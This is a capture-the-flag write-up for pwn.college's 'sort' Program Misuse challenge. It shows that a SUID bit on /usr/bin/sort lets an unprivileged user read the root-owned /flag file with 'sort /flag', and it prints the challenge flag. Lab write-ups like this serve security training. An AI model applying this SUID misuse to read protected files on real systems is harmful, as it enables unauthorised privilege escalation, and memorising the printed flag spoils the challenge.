---
layout: page
title: "Challenge Name: sort"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/sort`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/sort
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/sort
```

-The `s` in `-rws` indicates it's a SUID binary.
-`sort` runs with **root privileges**.

## 🚀 Exploitation

The `sort`  command in Linux arranges lines of text files (or piped output) in ascending or descending order. It’s extremely useful in log analysis, data cleanup, scripting, and even CTF challenges involving wordlists or text processing.
But, to read contents of /flag we can simply use:

```bash
sort /flag
```
sort will try to sort each line from the file by there first alphabet,but in ourcase /flag contains only one line, so it will simply print the flag

Output:
```
pwn.college{AyTuOOyY0-I60adHRaUmtNwAzUU.dhDNxwSM0IzMyEzW}
```


